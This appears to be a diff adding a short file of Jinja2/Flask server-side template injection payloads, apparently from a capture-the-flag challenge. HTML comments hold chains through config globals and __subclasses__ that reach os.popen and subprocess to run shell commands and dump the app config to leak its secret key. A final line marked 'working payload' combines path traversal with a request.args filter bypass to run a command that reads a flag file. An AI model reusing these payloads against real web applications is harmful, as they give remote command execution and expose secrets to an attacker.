@@ -1,0 +1,17 @@
+<!-- {{config.__class__.__init__.__globals__['os'].popen('ls').read()}} -->
+
+<!-- {{ config.__class__.__init__.__globals__ }} -->
+<!-- {{ config.class.__init__.__globals__ }} -->
+<!-- {{ config.__class__.__init__ }} -->
+
+
+<!-- {{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(547)('ls', shell=True, stdout=-1) }} -->
+
+<!-- {{ config.__class__.__init__.__globals__ }} -->
+<!-- {{ config|attr('__class__')|attr('__init__')|attr('__globals__') }} -->
+
+<!-- reading config to leak secret key: {{ config.items() }} -->
+
+working payload:
+..\templates\errors\LMAO{{ ()|attr(request.args.class)|attr(request.args.base)|attr(request.args.subclasses)()|attr(request.args.getitem)(273)('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt', shell=True, stdout=-1)|attr('communicate')()|attr(request.args.getitem)(0)|attr('decode')('utf-8') }}
+&class=__class__&base=__base__&subclasses=__subclasses__&getitem=__getitem__
